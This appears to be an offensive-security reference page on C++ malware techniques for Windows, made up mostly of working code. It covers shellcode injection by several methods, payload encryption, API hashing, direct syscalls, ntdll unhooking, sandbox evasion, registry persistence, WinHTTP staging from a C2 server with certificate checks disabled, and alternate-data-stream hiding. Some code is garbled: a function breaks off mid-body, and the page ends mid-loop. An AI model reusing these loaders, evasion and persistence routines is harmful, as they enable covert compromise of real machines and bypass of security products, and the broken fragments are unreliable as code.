C++: Offensive Techniques

C/C++ is the language of choice for offensive tool development. Direct access to the Windows API, control over memory layout, the ability to call syscalls directly, and output as native PE files make C++ ideal for shellcode runners, injectors, loaders, and implants. This page covers the core primitives found in real-world offensive tooling — all battle-tested patterns from production red team toolsets.

Process Injection (Classic)

The foundational injection primitive: open a target process, allocate executable memory in it, write shellcode, then spawn a thread at the shellcode address. Works against most targets without EDR but leaves clear forensic indicators (CreateRemoteThread).

#include <windows.h>
#include <stdio.h>

// Replace with msfvenom / Donut output:
// msfvenom -p windows/x64/exec CMD=calc.exe -f c -v shellcode
unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
    int pid = atoi(argv[1]);  // target PID from command line

    // 1. Open target process with full access
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) { printf("[-] OpenProcess failed: %d\n", GetLastError()); return 1; }

    // 2. Allocate RWX memory in target (noisy — prefer RW then VirtualProtect to RX)
    PVOID pRemote = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                   MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pRemote) { printf("[-] VirtualAllocEx failed\n"); return 1; }

    // 3. Write shellcode to the allocated region
    WriteProcessMemory(hProcess, pRemote, shellcode, sizeof(shellcode), NULL);

    // 4. Start a remote thread at the shellcode address
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
    if (!hThread) { printf("[-] CreateRemoteThread failed\n"); return 1; }

    printf("[+] Injected into PID %d\n", pid);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}

# cl.exe process_inject.c /link kernel32.lib

# Stealthier allocation: RW first, then flip to RX after writing:
# PVOID pRemote = VirtualAllocEx(hProcess, NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
# WriteProcessMemory(hProcess, pRemote, shellcode, sz, NULL);
# DWORD old; VirtualProtectEx(hProcess, pRemote, sz, PAGE_EXECUTE_READ, &old);

Thread Hijacking (QueueUserAPC)

Instead of creating a new thread (easily detected), queue an APC to an existing alertable thread in the target process. Lower behavioral noise than CreateRemoteThread.

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

unsigned char shellcode[] = "";

// Find a thread in a given PID
DWORD getThreadId(DWORD pid) {
    THREADENTRY32 te32 = { sizeof(te32) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (Thread32First(snap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                CloseHandle(snap);
                return te32.th32ThreadID;
            }
        } while (Thread32Next(snap, &te32));
    }
    CloseHandle(snap);
    return 0;
}

int main(int argc, char *argv[]) {
    DWORD pid = atoi(argv[1]);
    DWORD tid = getThreadId(pid);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread  = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);

    // Allocate and write shellcode
    PVOID pRemote = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, pRemote, shellcode, sizeof(shellcode), NULL);

    // Queue APC to existing thread — fires when thread enters alertable wait
    QueueUserAPC((PAPCFUNC)pRemote, hThread, 0);

    printf("[+] APC queued to TID %d in PID %d\n", tid, pid);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}

# Note: APC executes only when target thread calls SleepEx, WaitForSingleObjectEx,
# MsgWaitForMultipleObjectsEx, etc. (alertable wait state).
# Explorer.exe and svchost.exe threads commonly enter alertable state.

Callback-Based Shellcode Execution

Execute shellcode by passing a pointer to it as a callback to legitimate Windows API functions. This avoids calling CreateThread directly — execution happens inside a trusted system call.

#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "";

int main() {
    // Allocate RWX memory in current process
    PVOID exec = VirtualAlloc(NULL, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));

    // Technique 1: EnumWindows callback
    // EnumWindows will call our shellcode as if it were a window enumeration callback
    EnumWindows((WNDENUMPROC)exec, 0);

    // Technique 2: EnumChildWindows
    // EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)exec, 0);

    // Technique 3: EnumDesktopWindows
    // EnumDesktopWindows(NULL, (WNDENUMPROC)exec, 0);

    // Technique 4: CreateTimerQueueTimer
    // HANDLE hTimer = NULL, hQueue = CreateTimerQueue();
    // CreateTimerQueueTimer(&hTimer, hQueue, (WAITORTIMERCALLBACK)exec, NULL, 0, 0, 0);
    // WaitForSingleObject(CreateEvent(NULL, FALSE, FALSE, NULL), 2000);

    // Technique 5: SetTimer (requires message loop)
    // SetTimer(NULL, 0, 0, (TIMERPROC)exec);
    // MSG msg; GetMessage(&msg, NULL, 0, 0); // pump message to fire timer

    return 0;
}

XOR Shellcode Encryption / Decryption

XOR-encrypt shellcode at build time to defeat static signature detection. The decryption stub runs at execution time, restoring the payload in memory before jumping to it.

#include <windows.h>
#include <stdio.h>

// --- Encrypt at build time (run once, capture output, embed result) ---
unsigned char raw_payload[] = "REPLACE_WITH_SHELLCODE";

void xor_encrypt(char *payload, int len, char *key, int keylen) {
    int j = 0;
    for (int i = 0; i < len; i++) {
        if (j == keylen - 1) j = 0;
        payload[i] ^= key[j];
        j++;
    }
}

// --- Decrypt and execute at runtime ---
// XOR'd payload (output of the encryption step above):
unsigned char enc_shellcode[] = { /* paste encrypted bytes here */ };

void xor_decrypt_exec(unsigned char *payload, int len, char *key, int keylen) {
    int j = 0;
    for (int i = 0; i < len - 1; i++) {
        if (j == keylen - 1) j = 0;
        payload[i] ^= key[j];
        j++;
    }
}

int main() {
    char key[] = "S3cr3tKey!";

    // Decrypt in place
    xor_decrypt_exec(enc_shellcode, sizeof(enc_shellcode), key, sizeof(key));

    // Allocate executable memory, copy decrypted shellcode, execute
    void *exec = VirtualAlloc(0, sizeof(enc_shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, enc_shellcode, sizeof(enc_shellcode));
    ((void(*)())exec)();
    return 0;
}

# Better: use AES-128/256 instead of XOR for stronger protection:
# Encrypt offline:  openssl enc -aes-256-cbc -nosalt -in shell.bin -out enc.bin -K KEY -iv IV
# Decrypt in C:  use BCryptDecrypt (Windows CNG API) — no openssl dependency
# Key management: derive key from environment variable, hostname, registry value, etc.

WinAPI Hashing (Import Obfuscation)

Instead of importing functions by name (visible in the IAT and suspicious to static analyzers), walk the export directory of a loaded DLL and find functions by a hash of their name. The actual API string never appears in the binary.

#include <windows.h>
#include <stdio.h>

// Simple hash function — customize to make it unique
DWORD calcHash(char *data) {
    DWORD hash = 0x35;
    for (int i = 0; i < (int)strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

// Walk export table of loaded DLL and find function by hash
LPVOID getAPIByHash(HMODULE hMod, DWORD targetHash) {
    PIMAGE_DOS_HEADER  dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS  nth = (PIMAGE_NT_HEADERS)((LPBYTE)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(
        (LPBYTE)hMod + nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD names  = (PDWORD)((LPBYTE)hMod + exp->AddressOfNames);
    PDWORD addrs  = (PDWORD)((LPBYTE)hMod + exp->AddressOfFunctions);
    PWORD  ords   = (PWORD)((LPBYTE)hMod + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *funcName = (char *)((LPBYTE)hMod + names[i]);
        if (calcHash(funcName) == targetHash) {
            return (LPVOID)((LPBYTE)hMod + addrs[ords[i]]);
        }
    }
    return NULL;
}

int main() {
    // Pre-compute hashes (offline / at build time):
    // printf("VirtualAlloc hash: 0x%X\n", calcHash("VirtualAlloc"));
    // printf("CreateThread hash: 0x%X\n", calcHash("CreateThread"));

    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");

    // Typedef for VirtualAlloc
    typedef LPVOID (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)getAPIByHash(hKernel32, 0x4C0BEEF1); // precomputed

    // Use the resolved function pointer
    LPVOID mem = pVirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[+] VirtualAlloc via hash: %p\n", mem);
    return 0;
}

# to find already-loaded DLLs (kernel32 is always loaded):
# PPEB pPEB = (PPEB)__readgsqword(0x60);  // x64
# PPEB pPEB = (PPEB)__readfsdword(0x30);  // x86
# Walk pPEB->Ldr->InLoadOrderModuleList to find kernel32 base address

Direct Syscalls

Bypass EDR user-mode hooks in ntdll.dll by invoking Windows syscalls directly, without going through the hooked ntdll stubs. The syscall number (SSN) is extracted from the on-disk copy of ntdll, then a small stub executes the syscall instruction directly.

#include <Windows.h>
#include <stdio.h>

// getSyscall.h — extract SSN from ntdll on disk, build stub in memory
// (from github.com/JohnWoodman/stealthInjector — see OffensiveCpp/SysCall Examples)

// Direct syscall function pointer typedefs (NT native API):
typedef NTSTATUS (NTAPI *myNtAllocateVirtualMemory)(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PULONG RegionSize, ULONG AllocationType, ULONG Protect);

typedef NTSTATUS (NTAPI *myNtWriteVirtualMemory)(
    HANDLE ProcessHandle, LPVOID BaseAddress, char *Buffer,
    ULONG RegionSize, PULONG NumBytesWritten);

typedef NTSTATUS (NTAPI *myNtCreateThreadEx)(
    PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjAttrs,
    HANDLE ProcessHandle, PVOID lpStartAddr, PVOID lpParam,
    ULONG Flags, SIZE_T ZeroBits, SIZE_T StackCommit,
    SIZE_T StackReserve, PVOID lpBytesBuffer);

// Hardcoded SSNs (Windows 10 20H2 x64 — verify per target OS version)
// SSN for NtAllocateVirtualMemory = 0x18, NtWriteVirtualMemory = 0x3A, NtCreateThreadEx = 0xC1
// Use SysWhispers3 / HellsGate / HalosGate to resolve SSNs dynamically at runtime

// x64 syscall stub (15 bytes):
// 4C 8B D1          mov r10, rcx
// B8 XX 00 00 00    mov eax, SSN
// 0F 05             syscall
// C3                ret
BYTE buildStub(BYTE *buf, DWORD ssn) {
    buf[0] = 0x4C; buf[1] = 0x8B; buf[2] = 0xD1;   // mov r10, rcx
    buf[3] = 0xB8;                                   // mov eax,
    *(DWORD*)(buf+4) = ssn;                          //   SSN
    buf[8] = 0x0F; buf[9] = 0x05;                   // syscall
    buf[10] = 0xC3;                                  // ret
    return 11;
}

int main() {
    char shellcode[] = "";
    SIZE_T size = sizeof(shellcode);
    PVOID base = NULL;

    // Build NtAllocateVirtualMemory stub
    BYTE allocStub[16] = {};
    buildStub(allocStub, 0x18);  // SSN — must match target OS
    DWORD old;
    VirtualProtect(allocStub, sizeof(allocStub), PAGE_EXECUTE_READWRITE, &old);

    myNtAllocateVirtualMemory NtAlloc = (myNtAllocateVirtualMemory)allocStub;
    NtAlloc(GetCurrentProcess(), &base, 0, (PULONG)&size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(base, shellcode, sizeof(shellcode));
    ((void(*)())base)();
    return 0;
}

NTDLL Unhooking (Disk Remap)

EDR products install hooks by patching the first bytes of NT syscall stubs in ntdll.dll in memory. The cleanest bypass: read a fresh, unhooked copy of ntdll from disk, map it into the process, then overwrite the hooked .text section with the clean copy.

// Source: ired.team — How to unhook a DLL using C++
#include <Windows.h>
#include <psapi.h>
#include <stdio.h>

int main() {
    HANDLE hProc   = GetCurrentProcess();
    MODULEINFO mi  = {};
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    // Get the base address and size of the loaded (hooked) ntdll
    GetModuleInformation(hProc, hNtdll, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

    // Open the on-disk ntdll.dll (clean, unhooked)
    HANDLE hFile = CreateFileA("c:\\windows\\system32\\ntdll.dll",
                               GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);

    // Map the file as an image section (SEC_IMAGE parses PE headers correctly)
    HANDLE hMap  = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

    // Walk PE sections and overwrite the .text section
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + dos->e_lfanew);

    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sec = (PIMAGE_SECTION_HEADER)(
            (DWORD_PTR)IMAGE_FIRST_SECTION(nth) + i * IMAGE_SIZEOF_SECTION_HEADER);

        if (!strcmp((char*)sec->Name, ".text")) {
            DWORD oldProt = 0;
            LPVOID target = (LPVOID)((DWORD_PTR)ntdllBase + sec->VirtualAddress);
            LPVOID source = (LPVOID)((DWORD_PTR)clean + sec->VirtualAddress);

            // Temporarily make .text writable
            VirtualProtect(target, sec->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);
            // Overwrite with clean bytes from disk
            memcpy(target, source, sec->Misc.VirtualSize);
            // Restore original protection
            VirtualProtect(target, sec->Misc.VirtualSize, oldProt, &oldProt);
            printf("[+] ntdll .text section restored from disk\n");
            break;
        }
    }

    CloseHandle(hProc); CloseHandle(hFile); CloseHandle(hMap); FreeLibrary(hNtdll);
    return 0;
}

# Alternative unhooking approaches:
# 1. Overwrite only the patched bytes (requires knowing original bytes — read from KnownDlls)
# 2. Load ntdll copy from NTFS ADS or from a suspended process mapping
# 3. Use direct syscalls instead (avoids hooks without touching ntdll)
# 4. Perun's Fart / Full DLL Refresh — refreshes all hooked DLLs in one pass

Sandbox Evasion Checks

Sandboxes used by AV vendors are typically VMs with limited RAM, no real users, and controlled network. Check for these artifacts before executing payload.

#include <Windows.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <Winternl.h>
#include <stdio.h>
#pragma comment(lib, "IPHLPAPI.lib")

// Check 1: Minimum RAM (sandboxes often have <1 GB)
BOOL checkRAM(DWORDLONG minGB) {
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    return (ms.ullTotalPhys / 1073741824) >= minGB;
}

// Check 2: PEB BeingDebugged flag
BOOL isDebuggerPresent() {
    PPEB pPEB = (PPEB)__readgsqword(0x60);  // x64
    return pPEB->BeingDebugged;
}

// Check 3: Known sandbox / analysis tool process names
BOOL sandboxProcessRunning() {
    const wchar_t *badProcs[] = {
        L"vmsrvc", L"tcpview", L"wireshark", L"fiddler", L"vmware",
        L"vbox", L"vboxtray", L"vmtools", L"vmrawdsk", L"vmusbmouse",
        L"vmmemctl", L"df5serv", L"vboxservice", L"vmhgfs",
        L"ollydbg", L"x32dbg", L"x64dbg", L"windbg", L"idaq",
        L"procmon", L"processhacker", NULL
    };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            for (int i = 0; badProcs[i]; i++) {
                if (wcsstr(pe.szExeFile, badProcs[i])) {
                    CloseHandle(snap); return TRUE;
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap); return FALSE;
}

// Check 4: VM MAC address prefixes
BOOL vmMacAddress() {
    BYTE badMAC[5][3] = {
        {0x00, 0x0C, 0x29}, // VMware
        {0x00, 0x1C, 0x14}, // VMware
        {0x00, 0x50, 0x56}, // VMware ESX
        {0x00, 0x05, 0x69}, // VMware
        {0x08, 0x00, 0x27}  // VirtualBox
    };
    ULONG outLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO info = (PIP_ADAPTER_INFO)malloc(outLen);
    if (GetAdaptersInfo(info, &outLen) == ERROR_BUFFER_OVERFLOW) {
        free(info); info = (PIP_ADAPTER_INFO)malloc(outLen);
    }
    if (GetAdaptersInfo(info, &outLen) == NO_ERROR) {
        for (PIP_ADAPTER_INFO a = info; a; a = a->Next) {
            for (int i = 0; i < 5; i++) {
                if (!memcmp(badMAC[i], a->Address, 3)) { free(info); return TRUE; }
            }
        }
    }
    free(info); return FALSE;
}

// Check 5: Username checks (sandbox users)
BOOL isSandboxUser() {
    char user[256]; DWORD sz = sizeof(user);
    GetUserNameA(user, &sz);
    const char *badUsers[] = { "sandbox", "malware", "virus", "test", "analysis", NULL };
    for (int i = 0; badUsers[i]; i++) {
        if (strstr(user, badUsers[i])) return TRUE;
    }
    return FALSE;
}

int main() {
    if (!checkRAM(1))          { printf("[-] Insufficient RAM — likely sandbox\n"); return 1; }
    if (isDebuggerPresent())   { printf("[-] Debugger detected\n"); return 1; }
    if (sandboxProcessRunning()){ printf("[-] Analysis tool running\n"); return 1; }
    if (vmMacAddress())        { printf("[-] VM MAC address detected\n"); return 1; }
    if (isSandboxUser())       { printf("[-] Sandbox username detected\n"); return 1; }

    printf("[+] Environment looks clean — executing payload\n");
    // ... load and execute payload
    return 0;
}

Persistence — Registry & Screensaver

#include <windows.h>
#include <stdio.h>

// Technique 1: HKCU Run key (no admin required)
// Payload executes when the current user logs in
void persistRunKey(const char *payloadPath) {
    HKEY hKey;
    RegCreateKeyExA(HKEY_CURRENT_USER,
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, "WindowsUpdateHelper", 0, REG_SZ,
                   (BYTE*)payloadPath, strlen(payloadPath) + 1);
    RegCloseKey(hKey);
}

// Technique 2: Screensaver hijacking (HKCU, no admin required)
// Activates after 10-second idle — Turla APT technique
void persistScreensaver(const char *payloadPath) {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, KEY_WRITE, &hKey);
    RegSetValueExA(hKey, "SCRNSAVE.EXE", 0, REG_SZ, (BYTE*)payloadPath, strlen(payloadPath)+1);
    RegSetValueExA(hKey, "ScreenSaveActive", 0, REG_SZ, (BYTE*)"1", 2);
    RegSetValueExA(hKey, "ScreenSaveTimeOut", 0, REG_SZ, (BYTE*)"10", 3);
    RegCloseKey(hKey);
}

// Technique 3: AppInit_DLLs (HKLM, requires admin)
// DLL loaded by every process that loads user32.dll
void persistAppInit(const char *dllPath) {
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)dllPath, strlen(dllPath)+1);
    RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)"\x01\x00\x00\x00", 4);
    RegCloseKey(hKey);
    // Note: only works if Secure Boot / KMCI is disabled
}

// Technique 4: Winlogon helper (HKLM, requires admin)
// Runs at logon alongside winlogon.exe
void persistWinlogon(const char *payloadPath) {
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                  0, KEY_SET_VALUE, &hKey);
    // Append to existing Userinit value
    RegSetValueExA(hKey, "Userinit", 0, REG_SZ,
                   (BYTE*)"C:\\Windows\\system32\\userinit.exe,C:\\payload.exe", 50);
    RegCloseKey(hKey);
}

int main() {
    persistRunKey("C:\\Users\\Public\\svchost32.exe");
    printf("[+] Run key persistence set\n");
    return 0;
}

HTTP Staging via WinHTTP

Download encrypted shellcode from a C2 server at runtime, avoiding static detection of the payload bytes. WinHTTP is a native Windows library — no libcurl dependency, no suspicious imports.

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#pragma comment(lib, "winhttp.lib")

// Downloads shellcode from https://c2.host:443/enc.bin
// Returns: pointer to shellcode buffer, sets *outLen
LPVOID downloadShellcode(const wchar_t *host, short port, const wchar_t *path, SIZE_T *outLen) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                            WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);

    // Accept self-signed / invalid certs (common for C2 servers)
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                       WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    // Read response into a dynamically growing buffer
    LPVOID buf = VirtualAlloc(NULL, 1024*1024, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    DWORD total = 0, avail = 0, read = 0;
    while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        WinHttpReadData(hRequest, (BYTE*)buf + total, avail, &read);
        total += read;
    }
    *outLen = total;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return buf;
}

// List all running processes (PID + name)
void enumProcesses() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };

// Get local IP address
void getIPAddress() {
    char hostname[256]; gethostname(hostname, sizeof(hostname));
    struct hostent *h = gethostbyname(hostname);
    printf("[+] Hostname: %s\n", hostname);
    for (int i = 0; h->h_addr_list[i]; i++) {
        printf("[+] IP: %s\n", inet_ntoa(*(struct in_addr*)h->h_addr_list[i]));
    }
}

// List open TCP connections
void enumNetworkConnections() {
    DWORD size = 0;
    GetExtendedTcpTable(NULL, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    PMIB_TCPTABLE_OWNER_PID tbl = (PMIB_TCPTABLE_OWNER_PID)malloc(size);
    if (GetExtendedTcpTable(tbl, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
        for (DWORD i = 0; i < tbl->dwNumEntries; i++) {
            MIB_TCPROW_OWNER_PID r = tbl->table[i];
            struct in_addr lAddr = {r.dwLocalAddr}, rAddr = {r.dwRemoteAddr};
            printf("%-15s %-5d -> %-15s %-5d  PID:%d\n",
                inet_ntoa(lAddr), ntohs((u_short)r.dwLocalPort),
                inet_ntoa(rAddr), ntohs((u_short)r.dwRemotePort),
                r.dwOwningPid);
        }
    }
    free(tbl);
}

// Scan for open ports on a target
void portScan(const char *target, int *ports, int numPorts) {
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    for (int i = 0; i < numPorts; i++) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        SOCKADDR_IN sa = { AF_INET, htons(ports[i]) };
        sa.sin_addr.s_addr = inet_addr(target);
        u_long mode = 1; ioctlsocket(s, FIONBIO, &mode);
        connect(s, (SOCKADDR*)&sa, sizeof(sa));
        FD_SET fds; FD_ZERO(&fds); FD_SET(s, &fds);
        TIMEVAL tv = {0, 500000}; // 500ms timeout
        if (select(0, NULL, &fds, NULL, &tv) == 1)
            printf("[OPEN] %s:%d\n", target, ports[i]);
        closesocket(s);
    }
    WSACleanup();
}

ADS Staging (Alternate Data Streams)

Hide shellcode in an NTFS Alternate Data Stream — the file appears empty to Windows Explorer and dir, but the payload survives on disk until execution.

#include <windows.h>
#include <stdio.h>

// Write shellcode to ADS (file:streamname syntax)
void writeADS(const char *file, const char *stream, BYTE *data, DWORD len) {
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s:%s", file, stream);
    HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written;
    WriteFile(hf, data, len, &written, NULL);
    CloseHandle(hf);
    printf("[+] Wrote %d bytes to %s\n", written, path);
}

// Read shellcode from ADS and execute
void execADS(const char *file, const char *stream) {
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s:%s", file, stream);
    HANDLE hf = CreateFileA(path, GENERIC_READ, 0, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD size = GetFileSize(hf, NULL);
    PVOID buf = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    DWORD read;
    ReadFile(hf, buf, size, &read, NULL);
    CloseHandle(hf);
    ((void(*)())buf)();
}

Process Stacking Injection

An advanced injection technique that fragments shellcode across multiple processes, then reassembles and executes it in a target. Because no single process holds the complete payload, memory forensics and single-process scanning miss the full shellcode. Execution is gated by a hardware breakpoint rather than a newly created thread.

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

// NtCreateThreadEx — avoids CreateRemoteThread (commonly flagged by EDR)
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjAttrs, IN HANDLE ProcessHandle,
    IN PVOID StartRoutine, IN PVOID Arg OPTIONAL,
    IN ULONG Flags, IN SIZE_T ZeroBits, IN SIZE_T StackSize,
    IN SIZE_T MaxStackSize, IN PVOID AttributeList OPTIONAL);

unsigned char shellcode[] = ""; // replace with msfvenom / Donut output
size_t shellcodeSize = sizeof(shellcode) - 1;
int numParts = 3;  // number of fragment processes
std::vector<DWORD> processList;

// Collect PIDs of suitable host processes (e.g., multiple notepad instances)
void CollectProcesses(const char* name) {
    PROCESSENTRY32 pe = { sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snap, &pe)) {
        do {
            char buf[260] = {};
            size_t n = 0; wcstombs_s(&n, buf, pe.szExeFile, _TRUNCATE);
            if (_stricmp(buf, name) == 0) processList.push_back(pe.th32ProcessID);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
}

// Inject one fragment (contiguous slice of shellcode) into a remote process
bool InjectFragment(DWORD pid, unsigned char* fragment, size_t size, LPVOID& outAddr) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return false;
    outAddr = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!outAddr) { CloseHandle(hProc); return false; }
    WriteProcessMemory(hProc, outAddr, fragment, size, NULL);
    std::cout << "[+] Fragment -> PID " << pid << " @ 0x" << outAddr << "\n";
    CloseHandle(hProc);
    return true;
}

// Reassemble fragments into target process and execute via NtCreateThreadEx
void Reassemble(DWORD targetPid, std::vector<std::pair<DWORD,LPVOID>>& fragments, size_t partSize) {
    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    // Allocate full shellcode region in target
    LPVOID dest = VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Read each fragment from its host process and write into target's contiguous buffer
    for (size_t i = 0; i < fragments.size(); i++) {
        auto [srcPid, srcAddr] = fragments[i];
        HANDLE hSrc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, srcPid);
        size_t thisSize = (i == fragments.size()-1) ? (shellcodeSize - i*partSize) : partSize;
        std::vector<BYTE> buf(thisSize);
        ReadProcessMemory(hSrc, srcAddr, buf.data(), thisSize, NULL);
        WriteProcessMemory(hTarget, (BYTE*)dest + i*partSize, buf.data(), thisSize, NULL);
        CloseHandle(hSrc);
    }

    // Execute via NtCreateThreadEx (avoids CreateRemoteThread telemetry)
    auto NtCTE = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtCreateThreadEx");
    HANDLE hThread;
    NTSTATUS status = NtCTE(&hThread, GENERIC_EXECUTE, NULL, hTarget,
                             dest, NULL, FALSE, 0, 0, 0, NULL);
    if (status == 0)
        std::cout << "[+] Shellcode executing in PID " << targetPid << "\n";
    else
        std::cout << "[-] NtCreateThreadEx failed: 0x" << std::hex << status << "\n";
    CloseHandle(hTarget);
}

int main() {
    CollectProcesses("notepad.exe");
    if (processList.size() < (size_t)(numParts + 1)) {
        std::cout << "[-] Need " << numParts+1 << " notepad.exe instances\n";
        return 1;
    }
    size_t partSize = shellcodeSize / numParts;
    std::vector<std::pair<DWORD,LPVOID>> fragments;

    // Inject fragments into the first N processes
    for (int i = 0; i < numParts; i++) {
        LPVOID addr;
